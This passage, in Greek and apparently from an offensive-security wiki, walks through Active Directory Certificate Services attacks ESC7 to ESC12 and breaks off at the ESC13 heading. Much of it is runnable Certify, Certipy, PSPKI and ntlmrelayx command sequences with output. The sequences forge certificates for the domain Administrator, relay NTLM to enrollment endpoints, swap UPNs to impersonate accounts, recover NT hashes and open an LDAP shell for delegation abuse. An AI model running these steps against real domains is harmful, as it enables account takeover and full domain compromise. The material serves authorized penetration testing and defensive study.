Τα δικαιώματα **`ManageCA`** σε μια αρχή πιστοποίησης επιτρέπουν στην principal να τροποποιεί ρυθμίσεις εξ αποστάσεως χρησιμοποιώντας το PSPKI. Σε αυτές περιλαμβάνεται η ενεργοποίηση ή απενεργοποίηση της σημαίας **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, ώστε να επιτρέπεται ο καθορισμός SAN σε οποιοδήποτε template, κάτι κρίσιμο για την κλιμάκωση προνομίων στον τομέα.

Η διαδικασία μπορεί να απλοποιηθεί με τη χρήση του cmdlet **Enable-PolicyModuleFlag** του PSPKI, επιτρέποντας τροποποιήσεις χωρίς άμεση αλληλεπίδραση με το GUI.

Τα δικαιώματα **`ManageCertificates`** επιτρέπουν την έγκριση εκκρεμών αιτημάτων, παρακάμπτοντας ουσιαστικά την προστασία «έγκριση από διαχειριστή πιστοποιητικών CA».

Μπορεί να χρησιμοποιηθεί ένας συνδυασμός των modules **Certify** και **PSPKI** για την υποβολή αιτήματος, την έγκριση και τη λήψη ενός πιστοποιητικού:

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Attack 2

#### Explanation

> [!WARNING]
> Στην **προηγούμενη επίθεση**, τα δικαιώματα **`Manage CA`** χρησιμοποιήθηκαν για να **ενεργοποιηθεί** η σημαία **EDITF_ATTRIBUTESUBJECTALTNAME2** και να πραγματοποιηθεί η **επίθεση ESC6**, αλλά αυτό δεν θα έχει αποτέλεσμα μέχρι να γίνει επανεκκίνηση της υπηρεσίας CA (`CertSvc`). Όταν ένας χρήστης έχει το δικαίωμα πρόσβασης `Manage CA`, επιτρέπεται επίσης να **επανεκκινήσει την υπηρεσία**. Ωστόσο, αυτό **δεν σημαίνει ότι ο χρήστης μπορεί να επανεκκινήσει την υπηρεσία απομακρυσμένα**. Επιπλέον, η επίθεση E**SC6 ενδέχεται να μη λειτουργεί απευθείας στα περισσότερα περιβάλλοντα που έχουν εγκατεστημένες ενημερώσεις κώδικα, λόγω των ενημερώσεων ασφαλείας του Μαΐου 2022.

Επομένως, παρουσιάζεται εδώ μια άλλη επίθεση.

Προαπαιτούμενα:

- Μόνο δικαίωμα **`ManageCA`**
- Δικαίωμα **`Manage Certificates`** (μπορεί να εκχωρηθεί από το **`ManageCA`**)
- Το πρότυπο πιστοποιητικού **`SubCA`** πρέπει να είναι **ενεργοποιημένο** (μπορεί να ενεργοποιηθεί από το **`ManageCA`**)

Η τεχνική βασίζεται στο γεγονός ότι οι χρήστες με δικαιώματα πρόσβασης `Manage CA` _και_ `Manage Certificates` μπορούν να **εκδίδουν αποτυχημένα αιτήματα πιστοποιητικών**. Το πρότυπο πιστοποιητικού **`SubCA`** είναι **ευάλωτο στην ESC1**, αλλά **μόνο οι διαχειριστές** μπορούν να εγγραφούν στο πρότυπο. Έτσι, ένας **χρήστης** μπορεί να **υποβάλει αίτημα** εγγραφής στο **`SubCA`** —το οποίο θα **απορριφθεί**— αλλά **στη συνέχεια θα εγκριθεί από τον διαχειριστή**.<sup>[[6]](#references)</sup>

#### Abuse

Μπορείτε να **εκχωρήσετε στον εαυτό σας το δικαίωμα πρόσβασης `Manage Certificates`**, προσθέτοντας τον χρήστη σας ως νέο υπεύθυνο.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

Το πρότυπο **`SubCA`** μπορεί να ενεργοποιηθεί στην CA με την παράμετρο `-enable-template`. Από προεπιλογή, το πρότυπο `SubCA` είναι ενεργοποιημένο.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

Αν έχουμε εκπληρώσει τις προϋποθέσεις για αυτήν την επίθεση, μπορούμε να ξεκινήσουμε **ζητώντας ένα certificate με βάση το template `SubCA`**.

**Αυτό το αίτημα θα απορριφθεί**, αλλά θα αποθηκεύσουμε το private key και θα σημειώσουμε το request ID.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

Με τα **`Manage CA` και `Manage Certificates`**, μπορούμε στη συνέχεια να εκδώσουμε το αίτημα πιστοποιητικού που απέτυχε, χρησιμοποιώντας την εντολή `ca` και την παράμετρο `-issue-request <request ID>`.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

Και τέλος, μπορούμε να **ανακτήσουμε το εκδοθέν πιστοποιητικό** με την εντολή `req` και την παράμετρο `-retrieve <request ID>`.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Attack 3 – Κατάχρηση Manage Certificates Extension (SetExtension)

#### Επεξήγηση

Πέρα από τις κλασικές καταχρήσεις ESC7 (ενεργοποίηση attributes EDITF ή έγκριση εκκρεμών αιτημάτων), το **Certify 2.0** αποκάλυψε ένα ολοκαίνουργιο primitive που απαιτεί μόνο τον ρόλο *Manage Certificates* (γνωστό και ως **Certificate Manager / Officer**) στην Enterprise CA.<sup>[[3]](#references)</sup>

Η RPC μέθοδος `ICertAdmin::SetExtension` μπορεί να εκτελεστεί από οποιοδήποτε principal έχει το δικαίωμα *Manage Certificates*. Παρότι παραδοσιακά η μέθοδος χρησιμοποιούνταν από νόμιμες CA για την ενημέρωση extensions σε **εκκρεμή** αιτήματα, ένας attacker μπορεί να την καταχραστεί για να **προσθέσει ένα *μη προεπιλεγμένο* certificate extension** (για παράδειγμα, ένα προσαρμοσμένο *Certificate Issuance Policy* OID όπως το `1.1.1.1`) σε ένα αίτημα που αναμένει έγκριση.

Επειδή το στοχευμένο template **δεν ορίζει προεπιλεγμένη τιμή για αυτό το extension**, η CA ΔΕΝ θα αντικαταστήσει την τιμή που ελέγχει ο attacker όταν τελικά εκδοθεί το αίτημα. Επομένως, το πιστοποιητικό που προκύπτει περιέχει ένα extension που έχει επιλέξει ο attacker και μπορεί να:

* Ικανοποιήσει απαιτήσεις Application / Issuance Policy άλλων ευάλωτων templates (οδηγώντας σε privilege escalation).
* Εισαγάγει πρόσθετα EKU ή policies που προσδίδουν στο πιστοποιητικό απρόσμενη εμπιστοσύνη σε συστήματα τρίτων.

Με λίγα λόγια, το *Manage Certificates* —το οποίο θεωρούνταν προηγουμένως το «λιγότερο ισχυρό» σκέλος του ESC7— μπορεί πλέον να αξιοποιηθεί για πλήρες privilege escalation ή μακροχρόνια persistence, χωρίς αλλαγές στις ρυθμίσεις της CA ή την απαίτηση του πιο περιοριστικού δικαιώματος *Manage CA*.

#### Κατάχρηση του primitive με το Certify 2.0

1. **Υποβάλετε ένα certificate request που θα παραμείνει *σε εκκρεμότητα*.** Αυτό μπορεί να επιτευχθεί με ένα template που απαιτεί έγκριση από manager:
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **Προσθέστε μια προσαρμοσμένη επέκταση στο εκκρεμές αίτημα** χρησιμοποιώντας τη νέα εντολή `manage-ca`:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *Εάν το πρότυπο δεν ορίζει ήδη την επέκταση *Certificate Issuance Policies*, η παραπάνω τιμή θα διατηρηθεί μετά την έκδοση.*

3. **Υποβάλετε το αίτημα** (εάν ο ρόλος σας διαθέτει επίσης δικαιώματα έγκρισης *Manage Certificates*) ή περιμένετε να το εγκρίνει ένας χειριστής. Μόλις εκδοθεί, κατεβάστε το πιστοποιητικό:
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. Το πιστοποιητικό που προκύπτει περιλαμβάνει πλέον το κακόβουλο OID issuance-policy και μπορεί να χρησιμοποιηθεί σε επόμενες επιθέσεις (π.χ. ESC13, domain escalation κ.λπ.).

> NOTE: Η ίδια επίθεση μπορεί να εκτελεστεί με το Certipy ≥ 4.7 μέσω της εντολής `ca` και της παραμέτρου `-set-extension`.

## NTLM Relay σε HTTP Endpoints του AD CS – ESC8

### Επεξήγηση

> [!TIP]
> Σε περιβάλλοντα όπου είναι **εγκατεστημένο το AD CS**, αν υπάρχει **ευάλωτο web enrollment endpoint** και είναι δημοσιευμένο τουλάχιστον ένα **certificate template** που επιτρέπει **εγγραφή υπολογιστών domain και client authentication** (όπως το προεπιλεγμένο template **`Machine`**), ένας attacker μπορεί να παραβιάσει **οποιονδήποτε υπολογιστή έχει ενεργή την υπηρεσία spooler**!

Το AD CS υποστηρίζει διάφορες **μεθόδους enrollment μέσω HTTP**, οι οποίες διατίθενται μέσω πρόσθετων ρόλων διακομιστή που μπορεί να εγκαταστήσουν οι διαχειριστές. Αυτές οι διεπαφές για certificate enrollment μέσω HTTP είναι ευάλωτες σε **NTLM relay attacks**. Ένας attacker, από ένα **παραβιασμένο μηχάνημα, μπορεί να υποδυθεί οποιονδήποτε λογαριασμό AD που πραγματοποιεί authentication μέσω εισερχόμενου NTLM**. Ενώ υποδύεται τον λογαριασμό του θύματος, ο attacker μπορεί να αποκτήσει πρόσβαση σε αυτές τις web διεπαφές και να **ζητήσει ένα client authentication certificate χρησιμοποιώντας τα certificate templates `User` ή `Machine`**.

- Η **web enrollment interface** (μια παλαιότερη εφαρμογή ASP που είναι διαθέσιμη στη διεύθυνση `http://<caserver>/certsrv/`) χρησιμοποιεί από προεπιλογή μόνο HTTP, το οποίο δεν παρέχει προστασία από NTLM relay attacks. Επιπλέον, επιτρέπει ρητά μόνο NTLM authentication μέσω του Authorization HTTP header, καθιστώντας ακατάλληλες πιο ασφαλείς μεθόδους authentication, όπως το Kerberos.
- Το **Certificate Enrollment Service** (CES), η web υπηρεσία **Certificate Enrollment Policy** (CEP) και το **Network Device Enrollment Service** (NDES) υποστηρίζουν από προεπιλογή negotiate authentication μέσω του Authorization HTTP header. Το negotiate authentication **υποστηρίζει τόσο** Kerberos όσο και **NTLM**, επιτρέποντας σε έναν attacker να **υποβαθμίσει το authentication σε NTLM** κατά τη διάρκεια relay attacks. Παρόλο που αυτές οι web υπηρεσίες ενεργοποιούν από προεπιλογή το HTTPS, το HTTPS από μόνο του **δεν προστατεύει από NTLM relay attacks**. Η προστασία από NTLM relay attacks σε HTTPS υπηρεσίες είναι δυνατή μόνο όταν το HTTPS συνδυάζεται με channel binding. Δυστυχώς, το AD CS δεν ενεργοποιεί το Extended Protection for Authentication στο IIS, το οποίο απαιτείται για το channel binding.<sup>[[6]](#references)</sup>

Ένα συνηθισμένο **πρόβλημα** με τα NTLM relay attacks είναι η **μικρή διάρκεια των NTLM sessions** και η αδυναμία του attacker να αλληλεπιδράσει με υπηρεσίες που **απαιτούν NTLM signing**.

Ωστόσο, αυτός ο περιορισμός παρακάμπτεται με την εκμετάλλευση ενός NTLM relay attack για την απόκτηση certificate για τον χρήστη, καθώς η περίοδος ισχύος του certificate καθορίζει τη διάρκεια του session και το certificate μπορεί να χρησιμοποιηθεί με υπηρεσίες που **απαιτούν NTLM signing**. Για οδηγίες σχετικά με τη χρήση ενός κλεμμένου certificate, ανατρέξτε στο:


{{#ref}}
account-persistence.md
{{#endref}}

Ένας ακόμη περιορισμός των NTLM relay attacks είναι ότι **ένας λογαριασμός-θύμα πρέπει να πραγματοποιήσει authentication σε μηχάνημα που ελέγχει ο attacker**. Ο attacker μπορεί είτε να περιμένει είτε να προσπαθήσει να **εξαναγκάσει** αυτό το authentication:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Εκμετάλλευση**

Η εντολή `cas` του [**Certify**](https://github.com/GhostPack/Certify) απαριθμεί τα **ενεργοποιημένα HTTP endpoints του AD CS**:<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Η ιδιότητα `msPKI-Enrollment-Servers` χρησιμοποιείται από τις εταιρικές Αρχές Πιστοποίησης (CAs) για την αποθήκευση των endpoints του Certificate Enrollment Service (CES). Αυτά τα endpoints μπορούν να αναλυθούν και να καταγραφούν με το εργαλείο **Certutil.exe**:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Κατάχρηση με Certify

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### Κατάχρηση με το [Certipy](https://github.com/ly4k/Certipy)

Το Certipy υποβάλλει από προεπιλογή το αίτημα πιστοποιητικού με βάση το template `Machine` ή `User`, ανάλογα με το αν το όνομα του account που γίνεται relay καταλήγει σε `$`. Για να καθοριστεί ένα εναλλακτικό template, μπορεί να χρησιμοποιηθεί η παράμετρος `-template`.

Στη συνέχεια, μπορεί να χρησιμοποιηθεί μια τεχνική όπως το [PetitPotam](https://github.com/ly4k/PetitPotam) για να εξαναγκαστεί authentication. Όταν πρόκειται για domain controllers, απαιτείται ο καθορισμός του `-template DomainController`.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## Χωρίς Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Επεξήγηση

Η τιμή **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) για το **`msPKI-Enrollment-Flag`**, που αναφέρεται ως ESC9, παραλείπει την επέκταση SID `szOID_NTDS_CA_SECURITY_EXT` από ένα certificate. Παλαιότερα παραδείγματα ESC9 βασίζονται στη συμπεριφορά συμβατότητας του KDC (`StrongCertificateBindingEnforcement=1`) ή σε ξεχωριστή διαδρομή weak Schannel mapping. Η τιμή `1` είναι **ιστορική ρύθμιση συμβατότητας**, όχι τρέχουσα προεπιλογή: Η Microsoft αναφέρει ότι η παράκαμψη KDC έπαψε να υποστηρίζεται με την ενημέρωση ασφαλείας των Windows της 9ης Σεπτεμβρίου 2025. Ελέγξτε την πραγματική ενημέρωση του στόχου και το authentication endpoint πριν εφαρμόσετε μια παλαιότερη συνταγή.<sup>[[7]](#references)</sup> Δείτε τις [οδηγίες ανάπτυξης της Microsoft](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Οι συνθήκες υπό τις οποίες αποκτά σημασία η ρύθμιση αυτής της σημαίας περιλαμβάνουν τα εξής:

- Σε ένα παλαιότερο, συμβατό KDC, η ενεργή πολιτική certificate-binding επιτρέπει το mapping· εναλλακτικά, το Schannel endpoint ενεργοποιεί ξεχωριστά το UPN mapping μέσω του bit `0x4` του `CertificateMappingMethods`.
- Το certificate φέρει τη σημαία `CT_FLAG_NO_SECURITY_EXTENSION` στη ρύθμιση `msPKI-Enrollment-Flag`.
- Το certificate καθορίζει οποιοδήποτε EKU για client authentication.
- Υπάρχουν δικαιώματα `GenericWrite` σε οποιονδήποτε λογαριασμό, ώστε να παραβιαστεί κάποιος άλλος.

### Σενάριο Κατάχρησης

Έστω ότι ο `John@corp.local` έχει δικαιώματα `GenericWrite` στον `Jane@corp.local` και στόχος είναι η παραβίαση του `Administrator@corp.local`. Το certificate template `ESC9`, στο οποίο επιτρέπεται να εγγραφεί ο `Jane@corp.local`, έχει διαμορφωθεί με τη σημαία `CT_FLAG_NO_SECURITY_EXTENSION` στη ρύθμιση `msPKI-Enrollment-Flag`.

Αρχικά, αποκτάται το hash της `Jane` μέσω Shadow Credentials, χάρη στα δικαιώματα `GenericWrite` του `John`:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

Στη συνέχεια, το `userPrincipalName` της `Jane` τροποποιείται σε `Administrator`, παραλείποντας σκόπιμα το τμήμα domain `@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Αυτή η τροποποίηση δεν παραβιάζει τους περιορισμούς, καθώς το `Administrator@corp.local` παραμένει διαφορετικό από το `userPrincipalName` του `Administrator`.

Στη συνέχεια, ζητείται ως `Jane` το πρότυπο πιστοποιητικού ESC9, το οποίο έχει επισημανθεί ως ευάλωτο:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

Σημειώνεται ότι το `userPrincipalName` του πιστοποιητικού αντικατοπτρίζει το `Administrator`, χωρίς κανένα «object SID».

Στη συνέχεια, το `userPrincipalName` της `Jane` επαναφέρεται στην αρχική του τιμή, `Jane@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Η προσπάθεια αυθεντικοποίησης με το εκδοθέν πιστοποιητικό αποδίδει πλέον το NT hash του `Administrator@corp.local`. Η εντολή πρέπει να περιλαμβάνει το `-domain <domain>`, επειδή το πιστοποιητικό δεν προσδιορίζει domain:

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## Αδύναμες αντιστοιχίσεις πιστοποιητικών - ESC10

### Επεξήγηση

Συχνά συζητούνται δύο ξεχωριστές πολιτικές αντιστοίχισης πιστοποιητικών στο πλαίσιο του ESC10. Ελέγξτε τη ρύθμιση στο endpoint που χειρίζεται πράγματι τον σχετικό έλεγχο ταυτότητας:

- Η ρύθμιση Schannel `CertificateMappingMethods` στο `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` ελέγχει την αντιστοίχιση πιστοποιητικών TLS client στον application server. Το bit UPN είναι `0x4`. Η προεπιλεγμένη τιμή σε ενημερωμένα συστήματα είναι `0x18` (`0x8 | 0x10`).
- Η ρύθμιση KDC `StrongCertificateBindingEnforcement` στο `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` έλεγχε ιστορικά τη συμβατότητα αντιστοίχισης πιστοποιητικών Kerberos. Η τιμή `1` δεν αποτελεί αξιόπιστη τρέχουσα προεπιλογή, και η Microsoft έπαψε να υποστηρίζει αυτήν την παράκαμψη με την ενημέρωση ασφαλείας των Windows της 9ης Σεπτεμβρίου 2025. Η κατάστασή της δεν περιγράφει από μόνη της την αντιστοίχιση UPN του Schannel.<sup>[[7]](#references)</sup>

**Περίπτωση 1**

Ιστορικά, όταν ένας παλαιότερος KDC λάμβανε υπόψη το `StrongCertificateBindingEnforcement=0`. Επαληθεύστε το επίπεδο ενημερώσεων, καθώς αυτή η παράκαμψη δεν υποστηρίζεται πλέον σε τρέχοντα ενημερωμένα συστήματα.

**Περίπτωση 2**

Όταν είναι ενεργοποιημένο το bit UPN (`0x4`) της ρύθμισης `CertificateMappingMethods` στο endpoint Schannel που χειρίζεται πιστοποιητικά client. Πρόκειται για ξεχωριστή ρύθμιση από την ισχυρή αντιστοίχιση KDC και εξακολουθεί να απαιτεί πιστοποιητικό ελέγχου ταυτότητας client που μπορεί να εκδοθεί, καθώς και αποτελεσματικό έλεγχο του χαρακτηριστικού του λογαριασμού με τον οποίο γίνεται η αντιστοίχιση.

### Περίπτωση κατάχρησης 1

Σε μια παλαιότερη εγκατάσταση όπου ο KDC εξακολουθεί να λαμβάνει υπόψη το `StrongCertificateBindingEnforcement=0`, ο έλεγχος του `userPrincipalName` ενός λογαριασμού μπορεί να αποτελέσει μέρος μιας διαδρομής αδύναμης αντιστοίχισης προς έναν άλλο λογαριασμό. Οι απαιτήσεις για έκδοση πιστοποιητικού, αντιστοίχιση, ταυτότητα στόχου και επιτυχή έλεγχο ταυτότητας πρέπει να επαληθεύονται ξεχωριστά. Μια ACE `GenericWrite` ή μια τιμή μητρώου από μόνη της δεν αποδεικνύει ότι μπορεί να αναληφθεί ο έλεγχος του λογαριασμού.

Για παράδειγμα, έχοντας δικαιώματα `GenericWrite` πάνω στο `Jane@corp.local`, ένας εισβολέας επιδιώκει να παραβιάσει το `Administrator@corp.local`. Η διαδικασία είναι παρόμοια με το ESC9 και επιτρέπει τη χρήση οποιουδήποτε προτύπου πιστοποιητικού.

Αρχικά, λαμβάνεται το hash της `Jane` μέσω του Shadow Credentials, κάνοντας κατάχρηση του `GenericWrite`.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

Στη συνέχεια, το `userPrincipalName` της `Jane` αλλάζει σε `Administrator`, παραλείποντας σκόπιμα το τμήμα `@corp.local` ώστε να αποφευχθεί παραβίαση περιορισμού.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Στη συνέχεια, ζητείται ένα πιστοποιητικό που επιτρέπει τον έλεγχο ταυτότητας πελάτη ως `Jane`, χρησιμοποιώντας το προεπιλεγμένο πρότυπο `User`.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

Το `userPrincipalName` της `Jane` επαναφέρεται κατόπιν στην αρχική του τιμή, `Jane@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Η αυθεντικοποίηση με το πιστοποιητικό που αποκτήθηκε θα αποδώσει το NT hash του `Administrator@corp.local`, οπότε απαιτείται ο καθορισμός του domain στην εντολή, καθώς το πιστοποιητικό δεν περιέχει στοιχεία domain.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Περίπτωση κατάχρησης 2

Όταν το `CertificateMappingMethods` περιλαμβάνει το bit flag `UPN` (`0x4`), ένας λογαριασμός A με δικαιώματα `GenericWrite` μπορεί να παραβιάσει οποιονδήποτε λογαριασμό B που δεν έχει ιδιότητα `userPrincipalName`, συμπεριλαμβανομένων λογαριασμών υπολογιστών και του ενσωματωμένου διαχειριστή τομέα `Administrator`.

Εδώ, ο στόχος είναι να παραβιαστεί ο λογαριασμός `DC$@corp.local`, ξεκινώντας με την απόκτηση του hash της `Jane` μέσω των Shadow Credentials και αξιοποιώντας το `GenericWrite`.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

Το `userPrincipalName` της `Jane` ορίζεται στη συνέχεια σε `DC$@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

Ζητείται ένα πιστοποιητικό για έλεγχο ταυτότητας πελάτη ως `Jane`, χρησιμοποιώντας το προεπιλεγμένο πρότυπο `User`.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

Το `userPrincipalName` της `Jane` επανέρχεται στην αρχική του τιμή μετά από αυτή τη διαδικασία.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Για την αυθεντικοποίηση μέσω Schannel, χρησιμοποιείται η επιλογή `-ldap-shell` του Certipy, υποδεικνύοντας επιτυχή αυθεντικοποίηση ως `u:CORP\DC$`.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Μέσω του LDAP shell, εντολές όπως η `set_rbcd` επιτρέπουν επιθέσεις Resource-Based Constrained Delegation (RBCD), οι οποίες μπορούν να θέσουν σε κίνδυνο τον domain controller.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Αυτή η ευπάθεια αφορά επίσης κάθε λογαριασμό χρήστη που δεν έχει `userPrincipalName` ή όπου αυτό δεν ταιριάζει με το `sAMAccountName`. Ο προεπιλεγμένος λογαριασμός `Administrator@corp.local` είναι κύριος στόχος, λόγω των αυξημένων δικαιωμάτων του στο LDAP και της απουσίας `userPrincipalName` από προεπιλογή.

## Relaying NTLM to ICPR - ESC11

### Επεξήγηση

Αν ο CA Server δεν έχει ρυθμιστεί με `IF_ENFORCEENCRYPTICERTREQUEST`, είναι δυνατή η εκτέλεση επιθέσεων NTLM relay χωρίς υπογραφή μέσω της υπηρεσίας RPC. [Αναφορά εδώ](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Μπορείτε να χρησιμοποιήσετε το `certipy` για να ελέγξετε αν είναι απενεργοποιημένη η επιλογή `Enforce Encryption for Requests`. Το certipy θα εμφανίσει τις ευπάθειες `ESC11`.

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### Σενάριο κατάχρησης

Πρέπει να ρυθμιστεί ένας relay server:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

Σημείωση: Για τους ελεγκτές τομέα, πρέπει να ορίσουμε το `-template` στο DomainController.

Ή χρησιμοποιώντας το [fork του impacket από τον sploutchy](https://github.com/sploutchy/impacket) :

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## Πρόσβαση Shell σε ADCS CA με YubiHSM - ESC12

### Επεξήγηση

Οι administrators μπορούν να ρυθμίσουν την Certificate Authority ώστε να αποθηκεύει το ιδιωτικό κλειδί της σε μια εξωτερική συσκευή, όπως το "Yubico YubiHSM2".

Αν μια συσκευή USB είναι συνδεδεμένη στον server της CA μέσω θύρας USB ή μέσω USB device server, σε περίπτωση που ο server της CA είναι virtual machine, απαιτείται ένα authentication key (το οποίο μερικές φορές αναφέρεται ως "password") για να δημιουργεί και να χρησιμοποιεί κλειδιά στο YubiHSM ο Key Storage Provider.

Αυτό το key/password αποθηκεύεται σε cleartext στο registry, στη διαδρομή `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`.

Αναφορά [εδώ](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Σενάριο κατάχρησης

Αν το ιδιωτικό κλειδί της CA είναι αποθηκευμένο σε φυσική συσκευή USB, μπορείτε να το ανακτήσετε όταν αποκτήσετε shell access.

Αρχικά, πρέπει να αποκτήσετε το πιστοποιητικό της CA (είναι δημόσιο) και έπειτα:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

Τέλος, χρησιμοποιήστε την εντολή certutil `-sign` για να πλαστογραφήσετε ένα νέο αυθαίρετο πιστοποιητικό, χρησιμοποιώντας το πιστοποιητικό CA και το ιδιωτικό του κλειδί.

## OID Group Link Abuse - ESC13

### Επεξήγηση

